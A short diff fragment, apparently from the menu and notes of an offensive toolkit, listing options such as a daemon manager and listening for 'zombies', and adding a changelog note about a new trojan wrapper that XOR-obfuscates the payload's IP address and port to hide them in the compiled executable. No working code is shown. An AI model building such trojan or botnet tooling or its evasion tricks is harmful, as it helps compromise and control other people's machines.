@@ -15,6 +15,7 @@ echo "26) DEAMON MANAGER by V.ex.e"
 echo "27) Start listening for zombies"
   
 - new trojan
+    FULL WRAPPER FOR CUSTOM EXEs
    XOR Encryption:
 
     The script employs a simple XOR encryption method to obfuscate the IP address and port in the payload, making it less readable in the compiled executable.
